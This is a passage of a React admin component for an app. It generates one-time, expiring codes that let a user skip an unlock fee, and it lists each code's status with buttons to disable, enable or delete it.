            Generate a one-time code that lets a user bypass the unlock fee. Each code can only be used once and expires after the set duration.
          </p>

          {/* Generator */}
          <div className="border border-[#1a1a1a] rounded-2xl p-5 space-y-4">
            <p className="text-white text-sm font-semibold flex items-center gap-2"><Plus className="w-4 h-4" /> Generate New Code</p>

            <div>
              <p className="text-[#48484A] text-xs mb-2 flex items-center gap-1"><Clock className="w-3 h-3" /> Duration</p>
              <div className="grid grid-cols-3 gap-2">
                {DURATION_OPTS.map(opt => (
                  <button key={opt.hours} onClick={() => setSelDuration(opt.hours)}
                    className={`py-2 px-3 rounded-xl text-xs font-medium border transition-colors ${selDuration === opt.hours ? "bg-white text-black border-white" : "bg-transparent text-[#636366] border-[#1c1c1e] hover:border-[#2c2c2e]"}`}>
                    {opt.label}
                  </button>
                ))}
                <button onClick={() => setSelDuration(-1)}
                  className={`py-2 px-3 rounded-xl text-xs font-medium border transition-colors ${selDuration === -1 ? "bg-white text-black border-white" : "bg-transparent text-[#636366] border-[#1c1c1e] hover:border-[#2c2c2e]"}`}>
                  Custom
                </button>
              </div>
              {selDuration === -1 && (
                <input type="number" min="1" value={customHours} onChange={(e) => setCustomHours(e.target.value)}
                  placeholder="Enter hours (e.g. 72)" className="mt-2 w-full bg-[#080808] border border-[#1c1c1e] rounded-xl px-4 py-3 text-white text-sm placeholder:text-[#333] outline-none focus:border-[#2c2c2e]" />
              )}
            </div>

            <button onClick={() => generate.mutate(durationHours)} disabled={generate.isPending || durationHours < 1}
              className="w-full py-3.5 bg-white text-black rounded-2xl text-sm font-semibold disabled:opacity-20 flex items-center justify-center gap-2">
              <Key className="w-4 h-4" /> {generate.isPending ? "Generating…" : "Generate Code"}
            </button>

            {newCode && (
              <div className="bg-[#0a0a0a] border border-[#1c1c1e] rounded-2xl p-4 text-center space-y-2">
                <p className="text-[#48484A] text-xs">New bypass code</p>
                <button onClick={() => { navigator.clipboard.writeText(newCode.code); toast$("Code copied"); }}
                  className="flex items-center gap-2 mx-auto">
                  <p className="text-white text-2xl font-mono font-bold tracking-widest">{newCode.code}</p>
                  <Copy className="w-4 h-4 text-[#0A84FF]" />
                </button>
                <p className="text-[#636366] text-xs">Expires: {new Date(newCode.expiresAt).toLocaleString()} · {fmtExpiry(newCode.expiresAt)}</p>
              </div>
            )}
          </div>

          {/* Code list */}
          <div className="space-y-2">
            <p className="text-[#48484A] text-xs uppercase tracking-widest">All Codes ({codes.length})</p>
            {codes.length === 0 ? (
              <div className="border border-dashed border-[#1a1a1a] rounded-2xl py-8 text-center">
                <p className="text-[#2c2c2c] text-sm">No codes generated yet</p>
              </div>
            ) : (
              <div className="border border-[#111] rounded-2xl overflow-hidden divide-y divide-[#0d0d0d]">
                {codes.map(c => {
                  const expired = new Date(c.expiresAt) < new Date();
                  const status = c.revoked ? "revoked" : c.usedBy ? "used" : expired ? "expired" : "active";
                  const statusColor = { active: "#30D158", used: "#0A84FF", expired: "#48484A", revoked: "#FF453A" }[status];
                  const StatusIcon = status === "active" ? ShieldCheck : ShieldOff;
                  return (
                    <div key={c.id} className="px-4 py-3.5 flex items-center gap-3">
                      <StatusIcon className="w-4 h-4 flex-shrink-0" style={{ color: statusColor }} />
                      <div className="flex-1 min-w-0">
                        <button onClick={() => { navigator.clipboard.writeText(c.code); toast$("Copied"); }}
                          className="flex items-center gap-1.5 group">
                          <p className="text-white font-mono font-bold text-sm tracking-widest">{c.code}</p>
                          <Copy className="w-3 h-3 text-[#3a3a3c] group-hover:text-[#0A84FF] transition-colors" />
                        </button>
                        <p className="text-[#3a3a3c] text-[10px] mt-0.5">
                          {status === "active" && `Active · ${fmtExpiry(c.expiresAt)}`}
                          {status === "used" && `Used · by ${c.usedBy?.slice(0, 8)}…`}
                          {status === "expired" && "Expired"}
                          {status === "revoked" && "Revoked"}
                          {" · "}{c.durationHours < 24 ? `${c.durationHours}h` : `${Math.floor(c.durationHours / 24)}d`} duration
                        </p>
                      </div>
                      <div className="flex items-center gap-1.5 flex-shrink-0">
                        {status === "active" && (
                          <button onClick={() => revoke.mutate(c.id)} className="text-[#FF9F0A] text-xs hover:opacity-70 transition-opacity px-2 py-1 border border-[#2c1a00] rounded-lg">
                            Disable
                          </button>
                        )}
                        {status === "revoked" && (
                          <button onClick={() => enableCode.mutate(c.id)} className="text-[#30D158] text-xs hover:opacity-70 transition-opacity px-2 py-1 border border-[#0d2818] rounded-lg">
                            Enable
                          </button>
                        )}
                        <button onClick={() => hardDelete.mutate(c.id)} className="text-[#FF453A] text-xs hover:opacity-70 transition-opacity px-2 py-1 border border-[#2c1a1a] rounded-lg">
                          Delete
                        </button>
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </div>
          <div className="h-6" />
        </div>
      )}
    </div>
  );
}
